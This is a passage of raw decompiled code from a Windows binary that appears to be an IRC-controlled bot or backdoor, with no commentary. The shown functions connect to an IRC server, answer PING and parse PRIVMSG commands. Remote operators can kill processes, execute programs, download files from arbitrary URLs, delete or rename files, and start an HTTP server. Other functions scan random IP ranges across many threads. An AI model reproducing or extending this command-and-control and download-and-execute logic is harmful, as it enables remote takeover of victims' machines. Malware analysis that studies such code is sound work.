  puStack_1c = puVar2;
  FUN_00402a70(*(uint **)(param_1 + 0x10),(uint *)&DAT_004061d4);
  if (((bool)uVar5) && (uVar5 = *(char *)(param_1 + 7) == -1, *(char *)(param_1 + 7) != -1)) {
    pcVar1 = (char *)(param_1 + 7);
    *pcVar1 = *pcVar1 + '\x01';
    uVar5 = *pcVar1 == '\0';
  }
  FUN_00402a70(*(uint **)(param_1 + 0x10),(uint *)&DAT_004061d4);
  if ((bool)uVar5) {
    uVar5 = *(char *)(param_1 + 7) == -1;
    if (*(char *)(param_1 + 7) == -1) {
      *(undefined *)(param_1 + 7) = 1;
    }
    else {
      pcVar1 = (char *)(param_1 + 7);
      *pcVar1 = *pcVar1 + '\x01';
      uVar5 = *pcVar1 == '\0';
    }
  }
  FUN_00402a70(*(uint **)(param_1 + 0x10),(uint *)&DAT_004061e0);
  if ((bool)uVar5) {
    if (*(byte *)(param_1 + 7) < 3) {
      *(undefined *)(param_1 + 7) = 0xff;
    }
    else {
      *(char *)(param_1 + 7) = *(char *)(param_1 + 7) + -2;
    }
  }
  if (*(int *)(param_1 + 0xc) != 0) {
    FUN_00405998(param_1);
    uVar3 = FUN_00403a28(0xff);
    *(char *)(param_1 + 6) = (char)uVar3 + '\x01';
    uVar3 = FUN_00403a28(0xff);
    *(char *)(param_1 + 7) = (char)uVar3 + '\x01';
  }
  if (*(int *)(param_1 + 8) != 0) {
    *(undefined *)(param_1 + 4) = 0xc0;
    *(undefined *)(param_1 + 5) = 0xa9;
    uVar3 = FUN_00403a28(0xff);
    *(char *)(param_1 + 6) = (char)uVar3 + '\x01';
    uVar3 = FUN_00403a28(0xff);
    *(char *)(param_1 + 7) = (char)uVar3 + '\x01';
  }
  FUN_00405af0(param_1,(uint)*(byte *)(param_1 + 4),&local_8);
  FUN_00405af0(param_1,(uint)*(byte *)(param_1 + 5),&local_c);
  FUN_00405af0(param_1,(uint)*(byte *)(param_1 + 6),&local_10);
  FUN_00405af0(param_1,(uint)*(byte *)(param_1 + 7),&local_14);
  iVar4 = local_14;
  FUN_004029ec((int *)(param_1 + 0x10),7);
  *in_FS_OFFSET = iVar4;
  FUN_004026b0(&local_14,4);
  return;
}



void FUN_004061f0(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  bool bVar4;
  
  iVar2 = 0;
  iVar3 = 0;
  FUN_0040268c((int *)(param_1 + 0x10));
  do {
    while( true ) {
      iVar1 = (**(code **)PTR_DAT_0040a6e4)();
      if (iVar1 != 0) break;
      (**(code **)PTR_DAT_0040a700)();
    }
    bVar4 = iVar2 != 0;
    if (bVar4) {
      FUN_00402a70(*(uint **)(param_1 + 0x10),(uint *)&DAT_00406374);
      if (bVar4) {
        FUN_0040268c((int *)(param_1 + 0x10));
      }
      else {
        FUN_00402a70(*(uint **)(param_1 + 0x10),(uint *)&DAT_00406380);
        if (bVar4) {
          FUN_004026e0((int *)(param_1 + 0x10),(undefined4 *)&DAT_00406374);
        }
        if (*(int *)(param_1 + 0x10) == 0) {
          FUN_004026e0((int *)(param_1 + 0x10),(undefined4 *)&DAT_00406380);
        }
      }
    }
    else {
      FUN_0040268c((int *)(param_1 + 0x10));
    }
    FUN_00406040(param_1);
    (**(code **)PTR_DAT_0040a67c)();
    (**(code **)PTR_DAT_0040a69c)();
    FUN_00402b24(*(undefined **)(param_1 + 0x10));
    (**(code **)PTR_DAT_0040a6d4)();
    iVar1 = (**(code **)PTR_DAT_0040a668)();
    if (iVar1 == -1) {
      (**(code **)PTR_DAT_0040a69c)();
      FUN_00402b24(*(undefined **)(param_1 + 0x10));
      (**(code **)PTR_DAT_0040a6d4)();
      iVar1 = (**(code **)PTR_DAT_0040a668)();
      if (iVar1 != -1) {
        iVar3 = -1;
      }
    }
    else {
      iVar3 = -1;
    }
    if (iVar3 != 0) {
      (**(code **)PTR_DAT_0040a6ec)();
      FUN_00402978((int *)(param_1 + 0x14),(undefined4 *)&DAT_0040638c,
                   *(undefined4 **)(param_1 + 0x10));
      iVar2 = func_0x00405f10(param_1);
    }
    (**(code **)PTR_DAT_0040a700)();
  } while( true );
}



void FUN_00406390(int param_1)

{
  undefined *puVar1;
  undefined4 uVar2;
  int iVar3;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined4 *in_FS_OFFSET;
  undefined *puStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  undefined *local_c;
  undefined *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  local_c = (undefined *)0x0;
  puStack_18 = &LAB_0040644f;
  puStack_1c = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_1c;
  *(undefined4 *)(param_1 + 0xc) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  FUN_00404b48(0xb4,(int *)&local_8);
  puVar1 = FUN_00402b24(local_8);
  uVar2 = FUN_00403af4((char)puVar1,extraout_DL,extraout_CL,0,0,puVar1);
  iVar3 = (**(code **)PTR_DAT_0040a674)();
  if (iVar3 != 0x102) {
    *(undefined4 *)(param_1 + 8) = 0xffffffff;
  }
  if (*(int *)(param_1 + 8) == 0) {
    FUN_00404b48(0xb5,(int *)&local_c);
    puVar1 = FUN_00402b24(local_c);
    FUN_00403af4((char)puVar1,extraout_DL_00,extraout_CL_00,0,0,puVar1);
    iVar3 = (**(code **)PTR_DAT_0040a674)();
    if (iVar3 != 0x102) {
      *(undefined4 *)(param_1 + 0xc) = 0xffffffff;
    }
  }
  FUN_004061f0(param_1);
  *in_FS_OFFSET = uVar2;
  puStack_1c = &LAB_00406456;
  FUN_004026b0((int *)&local_c,2);
  return;
}



void FUN_00406470(undefined4 param_1,undefined4 param_2,DWORD param_3)

{
  short sVar1;
  DWORD local_8;
  
  sVar1 = 0x1e;
  local_8 = param_3;
  do {
    FUN_00402648((LPSECURITY_ATTRIBUTES)0x0,0,&LAB_0040645c,&local_8,0,0);
    sVar1 = sVar1 + -1;
  } while (sVar1 != 0);
  return;
}



void FUN_00406508(int *param_1)

{
  int *in_FS_OFFSET;
  undefined *puStack_118;
  undefined *puStack_114;
  undefined *puStack_110;
  undefined4 *local_108;
  undefined4 local_104 [64];
  
  puStack_110 = &stack0xfffffffc;
  local_108 = (undefined4 *)0x0;
  puStack_114 = &LAB_00406580;
  puStack_118 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = (int)&puStack_118;
  (**(code **)PTR_DAT_0040a6ac)();
  FUN_004028f0((int *)&local_108,local_104,0x100);
  FUN_00402978(param_1,local_108,(undefined4 *)&LAB_00406594);
  *in_FS_OFFSET = (int)local_104;
  puStack_118 = &LAB_00406587;
  FUN_0040268c((int *)&local_108);
  return;
}



void FUN_004070d8(void)

{
  int *piVar1;
  int iVar2;
  undefined4 extraout_ECX;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  DWORD local_10;
  int *local_c;
  int *local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_8 = (int *)0x0;
  local_c = (int *)0x0;
  local_10 = 0;
  puStack_24 = &LAB_004071e5;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  iVar3 = 0;
  DAT_0040c7d0 = (int *)FUN_004054ac((int *)&DAT_00405484,'\x01',DAT_0040c7d4);
  FUN_00405614();
  while( true ) {
    iVar2 = FUN_00405634();
    if ((iVar2 == 0) || (DAT_0040a660 != '\0')) break;
    FUN_004033e4(&local_8,(int)&DAT_00407094,1);
    FUN_004033e4(&local_c,(int)&DAT_004070b8,1);
    piVar1 = FUN_004057bc((int *)&DAT_004053e8,'\x01',extraout_ECX);
    local_c[iVar3] = (int)piVar1;
    FUN_00405668((int)DAT_0040c7d0,(int)piVar1);
    local_8[iVar3 * 3 + 2] = local_c[iVar3];
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&DAT_00406f74,
                 local_8 + iVar3 * 3,0,&local_10);
    iVar3 = iVar3 + 1;
  }
  (**(code **)(*DAT_0040c7d0 + -4))(DAT_0040c7d0,1);
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_004071ec;
  puStack_24 = (undefined *)0x4071d6;
  FUN_004033f0(&local_c,(int)&DAT_004070b8);
  puStack_24 = (undefined *)0x4071e4;
  FUN_004033f0(&local_8,(int)&DAT_00407094);
  return;
}



void FUN_004071f4(undefined4 *param_1,undefined4 *param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined4 *local_c;
  undefined4 *local_8;
  
  puStack_10 = (undefined *)0x407208;
  local_c = param_2;
  local_8 = param_1;
  FUN_00402b14((int)param_1);
  puStack_10 = (undefined *)0x407210;
  FUN_00402b14((int)local_c);
  puStack_14 = &LAB_0040725f;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  DAT_0040a660 = 0;
  puStack_10 = &stack0xfffffffc;
  FUN_004026e0(&DAT_0040c7d4,local_8);
  FUN_004026e0((int *)&DAT_0040c7d8,local_c);
  FUN_004070d8();
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00407266;
  puStack_14 = (undefined *)0x40725e;
  FUN_004026b0((int *)&local_c,2);
  return;
}



int __stdcall shutdown(SOCKET s,int how)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004072d4. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = shutdown(s,how);
  return iVar1;
}



HRESULT __stdcall
URLDownloadToFileA(LPUNKNOWN param_1,LPCSTR param_2,LPCSTR param_3,DWORD param_4,
                  LPBINDSTATUSCALLBACK param_5)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407384. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = URLDownloadToFileA(param_1,param_2,param_3,param_4,param_5);
  return HVar1;
}



void FUN_0040741c(char *param_1,int *param_2)

{
  char *pcVar1;
  LPCSTR pCVar2;
  LPCSTR pCVar3;
  HRESULT HVar4;
  undefined4 *in_FS_OFFSET;
  DWORD DVar5;
  LPBINDSTATUSCALLBACK pIVar6;
  undefined4 uStack_38;
  undefined *puStack_34;
  undefined4 uStack_2c;
  undefined *puStack_28;
  undefined *puStack_24;
  undefined *local_14;
  undefined *local_10;
  int *local_c;
  char *local_8;
  
  local_10 = (undefined *)0x0;
  local_14 = (undefined *)0x0;
  puStack_24 = (undefined *)0x40743b;
  local_c = param_2;
  local_8 = param_1;
  FUN_00402b14((int)param_1);
  puStack_28 = &LAB_00407517;
  uStack_2c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_2c;
  puStack_24 = &stack0xfffffffc;
  pcVar1 = FUN_00402c64(" ",local_8);
  if ((short)pcVar1 != 0) {
    puStack_34 = (undefined *)0x407474;
    FUN_00402b80((int)local_8,1,(undefined4 *)(((uint)pcVar1 & 0xffff) - 1),(int *)&local_10);
    FUN_00402bc0((int *)&local_8,1,(uint)pcVar1 & 0xffff);
    FUN_00402724((int *)&local_14,(int)local_8);
  }
  puStack_34 = &LAB_004074c8;
  uStack_38 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_38;
  pIVar6 = (LPBINDSTATUSCALLBACK)0x0;
  DVar5 = 0;
  pCVar2 = FUN_00402b24(local_14);
  pCVar3 = FUN_00402b24(local_10);
  HVar4 = URLDownloadToFileA((LPUNKNOWN)0x0,pCVar3,pCVar2,DVar5,pIVar6);
  *in_FS_OFFSET = uStack_38;
  if (HVar4 == 0) {
    FUN_004026e0(local_c,(undefined4 *)"Download finished!");
  }
  else {
    FUN_004026e0(local_c,(undefined4 *)"Error while downloading!");
  }
  *in_FS_OFFSET = uStack_2c;
  puStack_24 = &LAB_0040751e;
  puStack_28 = (undefined *)0x40750e;
  FUN_004026b0((int *)&local_14,2);
  puStack_28 = (undefined *)0x407516;
  FUN_0040268c((int *)&local_8);
  return;
}



void FUN_00407574(undefined *param_1,int *param_2)

{
  LPCSTR lpApplicationName;
  undefined4 *in_FS_OFFSET;
  LPSTR lpCommandLine;
  LPSECURITY_ATTRIBUTES lpProcessAttributes;
  LPSECURITY_ATTRIBUTES lpThreadAttributes;
  BOOL BVar1;
  DWORD dwCreationFlags;
  LPVOID lpEnvironment;
  LPCSTR lpCurrentDirectory;
  _STARTUPINFOA *lpStartupInfo;
  _PROCESS_INFORMATION *lpProcessInformation;
  undefined4 uStack_6c;
  undefined *puStack_68;
  undefined *puStack_64;
  _PROCESS_INFORMATION local_5c;
  _STARTUPINFOA local_4c;
  undefined *local_8;
  
  puStack_64 = (undefined *)0x407588;
  local_8 = param_1;
  FUN_00402b14((int)param_1);
  puStack_68 = &LAB_00407616;
  uStack_6c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_6c;
  puStack_64 = &stack0xfffffffc;
  FUN_004019d0(&local_4c.cb,0x44,0);
  FUN_004019d0(&local_5c.hProcess,0x10,0);
  local_4c.cb = 0x44;
  lpProcessInformation = &local_5c;
  lpStartupInfo = &local_4c;
  lpCurrentDirectory = (LPCSTR)0x0;
  lpEnvironment = (LPVOID)0x0;
  dwCreationFlags = 0x220;
  BVar1 = 0;
  lpThreadAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  lpProcessAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  lpCommandLine = (LPSTR)0x0;
  lpApplicationName = FUN_00402b24(local_8);
  BVar1 = CreateProcessA(lpApplicationName,lpCommandLine,lpProcessAttributes,lpThreadAttributes,
                         BVar1,dwCreationFlags,lpEnvironment,lpCurrentDirectory,lpStartupInfo,
                         lpProcessInformation);
  if (BVar1 == 0) {
    FUN_004026e0(param_2,(undefined4 *)"Error");
  }
  else {
    FUN_004026e0(param_2,(undefined4 *)"Execute completed!");
  }
  *in_FS_OFFSET = uStack_6c;
  puStack_64 = &LAB_0040761d;
  puStack_68 = (undefined *)0x407615;
  FUN_0040268c((int *)&local_8);
  return;
}



void FUN_00407650(undefined4 *param_1)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  undefined4 *local_8;
  
  puStack_14 = (undefined *)0x407661;
  local_8 = param_1;
  FUN_00402b14((int)param_1);
  puStack_18 = &LAB_004076bd;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  puStack_14 = &stack0xfffffffc;
  iVar1 = FUN_00403228(DAT_0040c9d4);
  FUN_004033e4((int **)&DAT_0040c9d4,(int)&DAT_00407400,1);
  FUN_004026e0((int *)(DAT_0040c9d4 + iVar1 * 4),local_8);
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_004076c4;
  puStack_18 = (undefined *)0x4076bc;
  FUN_0040268c((int *)&local_8);
  return;
}



void FUN_004076cc(undefined4 *param_1)

{
  char *pcVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_c = (undefined4 *)0x0;
  puStack_14 = (undefined *)0x4076e3;
  local_8 = param_1;
  FUN_00402b14((int)param_1);
  puStack_18 = &LAB_00407771;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  puStack_14 = &stack0xfffffffc;
  pcVar1 = FUN_00402c64(" ",(char *)local_8);
  while (0 < (int)pcVar1) {
    FUN_00402b80((int)local_8,1,(undefined4 *)(pcVar1 + -1),(int *)&local_c);
    FUN_00407650(local_c);
    FUN_00402bc0((int *)&local_8,1,(int)pcVar1);
    pcVar1 = FUN_00402c64(" ",(char *)local_8);
  }
  iVar2 = FUN_0040292c((int)local_8);
  if (0 < iVar2) {
    FUN_00407650(local_8);
  }
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_00407778;
  puStack_18 = (undefined *)0x407770;
  FUN_004026b0((int *)&local_c,2);
  return;
}



void FUN_0040778c(void)

{
  int iVar1;
  
  iVar1 = FUN_00403230(DAT_0040c9d4);
  FUN_00402978(&DAT_0040c82c,(undefined4 *)"PONG ",*(undefined4 **)(DAT_0040c9d4 + iVar1 * 4));
  FUN_0040292c(DAT_0040c82c);
  thunk_FUN_00402b30(&DAT_0040c82c);
  (**(code **)PTR_DAT_0040a690)();
  return;
}



void FUN_004078a8(void)

{
  bool bVar1;
  char *pcVar2;
  uint uVar3;
  undefined4 *puVar4;
  int iVar5;
  LPCSTR lpFileName;
  BOOL BVar6;
  undefined4 *in_FS_OFFSET;
  undefined uVar7;
  int local_250;
  int local_24c;
  int local_248;
  byte *local_244;
  byte *local_240;
  byte local_23c [256];
  byte local_13c [244];
  undefined4 uStackY_48;
  byte *pbStackY_44;
  byte *pbStackY_40;
  byte *local_3c;
  byte *local_38;
  byte *local_34;
  byte *local_30;
  byte *local_2c;
  uint *in_stack_ffffffd8;
  undefined4 *in_stack_ffffffdc;
  int *piVar8;
  undefined4 **ppuVar9;
  byte *pbVar10;
  undefined4 *local_1c;
  byte *local_18;
  undefined4 *local_14;
  int local_10;
  undefined4 *local_c;
  byte *local_8;
  
  local_14 = (undefined4 *)&stack0xfffffffc;
  local_10 = 0x49;
  do {
    local_8 = (byte *)0x0;
    local_10 = local_10 + -1;
  } while (local_10 != 0);
  local_18 = &LAB_00407ed6;
  local_1c = (undefined4 *)*in_FS_OFFSET;
  *in_FS_OFFSET = &local_1c;
  FUN_004028f0((int *)&local_14,(undefined4 *)&DAT_0040c9d8,0x401);
  pcVar2 = FUN_00402c64("Nickname is already in use.",(char *)local_14);
  if ((int)pcVar2 < 1) {
    pcVar2 = FUN_00402c64("PING :",(char *)local_14);
    if ((int)pcVar2 < 1) {
      pcVar2 = FUN_00402c64("MOTD",(char *)local_14);
      if (0 < (int)pcVar2) {
        FUN_00403bdc((undefined4 *)&DAT_0040c9d8,0x401);
        FUN_00404b60(2,(int *)&local_1c);
        in_stack_ffffffd8 = (uint *)&DAT_00407f74;
        local_2c = (byte *)0x4079eb;
        in_stack_ffffffdc = local_1c;
        FUN_004029ec(&local_10,3);
        local_2c = (byte *)0x0;
        local_30 = (byte *)0x4079f5;
        local_30 = (byte *)FUN_0040292c(local_10);
        local_34 = (byte *)0x4079fe;
        local_34 = (byte *)thunk_FUN_00402b30(&local_10);
        local_38 = DAT_0040c830;
        local_3c = (byte *)0x407a0e;
        (**(code **)PTR_DAT_0040a690)();
      }
    }
    else {
      FUN_00403bdc((undefined4 *)&DAT_0040c9d8,0x401);
      FUN_004076cc(local_14);
      FUN_0040778c();
      in_stack_ffffffdc = (undefined4 *)0x4079a0;
      FUN_004033e4((int **)&DAT_0040c9d4,(int)&DAT_00407400,1);
    }
  }
  else {
    in_stack_ffffffd8 = (uint *)&DAT_00407f20;
    local_2c = (byte *)0x407903;
    in_stack_ffffffdc = DAT_0040c828;
    uVar3 = FUN_004019f0(10000);
    local_2c = (byte *)0x40790b;
    FUN_00403e60(uVar3,(int *)&local_18);
    local_2c = local_18;
    local_30 = &DAT_00407f2c;
    local_34 = &DAT_00407f38;
    local_38 = (byte *)0x407925;
    FUN_004029ec(&local_10,6);
    local_38 = (byte *)0x0;
    local_3c = (byte *)0x40792f;
    local_3c = (byte *)FUN_0040292c(local_10);
    pbStackY_40 = (byte *)0x407938;
    pbStackY_40 = (byte *)thunk_FUN_00402b30(&local_10);
    pbStackY_44 = DAT_0040c830;
    uStackY_48 = 0x407948;
    (**(code **)PTR_DAT_0040a690)();
    FUN_00403bdc((undefined4 *)&DAT_0040c9d8,0x401);
  }
  FUN_00404b60(1,(int *)&stack0xffffffdc);
  pcVar2 = (char *)0x407a2a;
  FUN_00402978((int *)&stack0xffffffe0,(undefined4 *)"login ",in_stack_ffffffdc);
  pcVar2 = FUN_00402c64(pcVar2,(char *)local_14);
  if (0 < (int)pcVar2) {
    piVar8 = (int *)&DAT_0040c824;
    puVar4 = (undefined4 *)FUN_00402c64(" ",(char *)local_14);
    FUN_00402b80((int)local_14,1,puVar4,piVar8);
  }
  pcVar2 = FUN_00402c64(DAT_0040c824,(char *)local_14);
  if (pcVar2 == (char *)0x1) {
    iVar5 = FUN_0040292c((int)DAT_0040c824);
    FUN_00402bc0((int *)&local_14,1,iVar5);
    pcVar2 = FUN_00402c64("PRIVMSG",(char *)local_14);
    uVar7 = pcVar2 == (char *)0x0;
    if (0 < (int)pcVar2) {
      pcVar2 = FUN_00402c64(":",(char *)local_14);
      FUN_00402bc0((int *)&local_14,1,(int)pcVar2);
      pcVar2 = FUN_00402c64("\r\n",(char *)local_14);
      uVar7 = (undefined4 *)(pcVar2 + -1) == (undefined4 *)0x0;
      FUN_00402cac((int *)&local_14,(undefined4 *)(pcVar2 + -1));
    }
    FUN_00403de8((byte *)local_14,(byte **)&stack0xffffffd8);
    FUN_00402a70(in_stack_ffffffd8,(uint *)&DAT_00407fb8);
    if ((bool)uVar7) {
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    FUN_00403de8((byte *)local_14,&local_2c);
    pcVar2 = FUN_00402c64("KILLPROCESS",(char *)local_2c);
    if (pcVar2 == (char *)0x1) {
      FUN_00402bc0((int *)&local_14,1,0xc);
      if (local_14 == (undefined4 *)0x0) {
        FUN_00402724((int *)&local_8,0x407ff4);
      }
      else {
        FUN_00402724((int *)&local_8,0x407fdc);
      }
    }
    FUN_00403de8((byte *)local_14,&local_30);
    pcVar2 = FUN_00402c64("EXECUTE",(char *)local_30);
    if (pcVar2 == (char *)0x1) {
      FUN_00402bc0((int *)&local_14,1,8);
      if (local_14 == (undefined4 *)0x0) {
        FUN_00402724((int *)&local_8,0x408024);
      }
      else {
        FUN_00407574((undefined *)local_14,(int *)&local_8);
      }
    }
    FUN_00403de8((byte *)local_14,&local_34);
    pcVar2 = FUN_00402c64("DOWNLOAD",(char *)local_34);
    if (pcVar2 == (char *)0x1) {
      FUN_00402bc0((int *)&local_14,1,9);
      FUN_0040741c((char *)local_14,(int *)&local_8);
    }
    FUN_00403de8((byte *)local_14,&local_38);
    pcVar2 = FUN_00402c64("DELETE",(char *)local_38);
    if (pcVar2 == (char *)0x1) {
      FUN_00402bc0((int *)&local_14,1,7);
      lpFileName = FUN_00402b24((undefined *)local_14);
      BVar6 = DeleteFileA(lpFileName);
      if (BVar6 == 0) {
        FUN_00402724((int *)&local_8,0x408080);
      }
      else {
        FUN_00402724((int *)&local_8,0x408064);
      }
    }
    FUN_00403de8((byte *)local_14,&local_3c);
    pcVar2 = FUN_00402c64("RENAME",(char *)local_3c);
    if (pcVar2 == (char *)0x1) {
      FUN_00402bc0((int *)&local_14,1,7);
      ppuVar9 = &local_c;
      pcVar2 = FUN_00402c64(" ",(char *)local_14);
      FUN_00402b80((int)local_14,1,(undefined4 *)(pcVar2 + -1),(int *)ppuVar9);
      pcVar2 = FUN_00402c64(" ",(char *)local_14);
      FUN_00402bc0((int *)&local_14,1,(int)pcVar2);
      FUN_00402908(local_13c,local_14,(undefined4 *)0xff);
      pbVar10 = local_13c;
      FUN_00402908(local_23c,local_c,(undefined4 *)0xff);
      bVar1 = FUN_00403f44(local_23c,pbVar10);
      if (bVar1) {
        FUN_00402724((int *)&local_8,0x4080a8);
      }
      else {
        FUN_00402724((int *)&local_8,0x4080c4);
      }
    }
    FUN_00403de8((byte *)local_14,&local_240);
    pcVar2 = FUN_00402c64("DISCONNECT",(char *)local_240);
    if (pcVar2 == (char *)0x1) {
      FUN_00402bc0((int *)&local_14,1,0xb);
      (**(code **)PTR_DAT_0040a6ec)();
      iVar5 = FUN_00403e88((byte *)local_14);
      if (iVar5 == 0) {
        iVar5 = 0x1e;
      }
      Sleep(iVar5 * 1000);
      goto LAB_00407eab;
    }
    FUN_00403de8((byte *)local_14,&local_244);
    pcVar2 = FUN_00402c64("HTTPSERVER",(char *)local_244);
    if (pcVar2 == (char *)0x1) {
      FUN_00402bc0((int *)&local_14,1,0xb);
      local_2c = (byte *)0x407d92;
      FUN_00402648((LPSECURITY_ATTRIBUTES)0x0,0,&LAB_004077e8,(LPDWORD)PTR_DAT_0040a6e0,0,0);
      FUN_00404804((undefined *)0x0,&local_248);
      local_2c = (byte *)0x407dbc;
      FUN_004029ec((int *)&local_8,3);
    }
    if (local_8 != (byte *)0x0) {
      FUN_00403bdc((undefined4 *)&DAT_0040c9d8,0x401);
      FUN_00404b60(2,&local_24c);
      local_2c = local_8;
      local_30 = &DAT_00407f74;
      local_34 = (byte *)0x407e05;
      FUN_004029ec(&local_10,5);
      local_34 = (byte *)0x0;
      local_38 = (byte *)0x407e0f;
      local_38 = (byte *)FUN_0040292c(local_10);
      local_3c = (byte *)0x407e18;
      local_3c = (byte *)thunk_FUN_00402b30(&local_10);
      pbStackY_40 = DAT_0040c830;
      pbStackY_44 = (byte *)0x407e28;
      (**(code **)PTR_DAT_0040a690)();
    }
  }
  pcVar2 = FUN_00402c64("JOIN",(char *)local_14);
  if (0 < (int)pcVar2) {
    FUN_00403bdc((undefined4 *)&DAT_0040c9d8,0x401);
    FUN_00404b60(2,&local_250);
    local_2c = &DAT_00407f74;
    local_30 = (byte *)0x407e79;
    FUN_004029ec(&local_10,4);
    local_30 = (byte *)0x0;
    local_34 = (byte *)0x407e83;
    local_34 = (byte *)FUN_0040292c(local_10);
    local_38 = (byte *)0x407e8c;
    local_38 = (byte *)thunk_FUN_00402b30(&local_10);
    local_3c = DAT_0040c830;
    pbStackY_40 = (byte *)0x407e9c;
    (**(code **)PTR_DAT_0040a690)();
  }
  FUN_00403bdc((undefined4 *)&DAT_0040c9d8,0x401);
LAB_00407eab:
  *in_FS_OFFSET = local_1c;
  local_14 = (undefined4 *)&LAB_00407edd;
  local_18 = (byte *)0x407ec8;
  FUN_004026b0(&local_250,5);
  local_18 = (byte *)0x407ed5;
  FUN_004026b0((int *)&local_3c,0xe);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040815c(void)

{
  uint uVar1;
  undefined4 uVar2;
  char *pcVar3;
  undefined4 *in_FS_OFFSET;
  byte **ppbVar4;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  byte *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack_18 = &LAB_0040826b;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  ppbVar4 = &local_8;
  uVar1 = FUN_00404bac(PTR_DAT_0040a6c8,0x11);
  uVar2 = FUN_00403a28(uVar1 & 0xffff);
  FUN_00404b78((short)uVar2 + 1,PTR_DAT_0040a6c8,0x11,(int *)ppbVar4);
  pcVar3 = FUN_00402c64(":",(char *)local_8);
  FUN_00402b80((int)local_8,1,(undefined4 *)(((uint)pcVar3 & 0xffff) - 1),(int *)&DAT_0040cde0);
  FUN_00402bc0((int *)&local_8,1,(uint)pcVar3 & 0xffff);
  _DAT_0040cde4 = FUN_00403e88(local_8);
  (**(code **)PTR_DAT_0040a6dc)();
  _DAT_0040c9c4 = 2;
  _DAT_0040c9c6 = (**(code **)PTR_DAT_0040a69c)();
  FUN_00402b24(DAT_0040cde0);
  _DAT_0040c9c8 = (**(code **)PTR_DAT_0040a6d4)();
  uVar2 = (**(code **)PTR_DAT_0040a67c)();
  DAT_0040c830 = uVar2;
  (**(code **)PTR_DAT_0040a668)();
  *in_FS_OFFSET = uVar2;
  FUN_0040268c((int *)&local_8);
  return;
}



void FUN_00408284(void)

{
  undefined4 uVar1;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  int local_c;
  int local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = 0;
  local_c = 0;
  puStack_18 = &LAB_004083ae;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  FUN_004014c4();
  uVar2 = FUN_004019f0(10000);
  FUN_00403e60(uVar2,&local_8);
  FUN_004029ec(&DAT_0040c82c,6);
  FUN_0040292c(DAT_0040c82c);
  thunk_FUN_00402b30(&DAT_0040c82c);
  (**(code **)PTR_DAT_0040a690)();
  uVar2 = FUN_004019f0(10000);
  FUN_00403e60(uVar2,&local_c);
  FUN_004029ec(&DAT_0040c82c,0x11);
  FUN_0040292c(DAT_0040c82c);
  thunk_FUN_00402b30(&DAT_0040c82c);
  uVar1 = DAT_0040c830;
  (**(code **)PTR_DAT_0040a690)();
  *in_FS_OFFSET = uVar1;
  FUN_004026b0(&local_c,2);
  return;
}



void FUN_00408464(void)

{
  shutdown(DAT_0040c830,2);
  (**(code **)PTR_DAT_0040a6ec)();
  Sleep(5000);
  FUN_0040815c();
  FUN_00408284();
  return;
}



void FUN_00408498(void)

{
  int iVar1;
  
  FUN_0040815c();
  FUN_00408284();
  do {
    while( true ) {
      iVar1 = (**(code **)PTR_DAT_0040a6a0)();
      if (0 < iVar1) break;
      FUN_00408464();
    }
    FUN_004078a8();
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004084d0(void)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_10;
  undefined *puStack_c;
  undefined *puStack_8;
  
  puStack_8 = &stack0xfffffffc;
  puStack_c = &LAB_0040852f;
  uStack_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_10;
  _DAT_0040cddc = _DAT_0040cddc + 1;
  if (_DAT_0040cddc == 0) {
    FUN_0040268c(&DAT_0040cde0);
    FUN_004033f0(&DAT_0040c9d4,(int)&DAT_00407400);
    FUN_0040268c(&DAT_0040c82c);
    FUN_0040268c(&DAT_0040c828);
    FUN_0040268c(&DAT_0040c824);
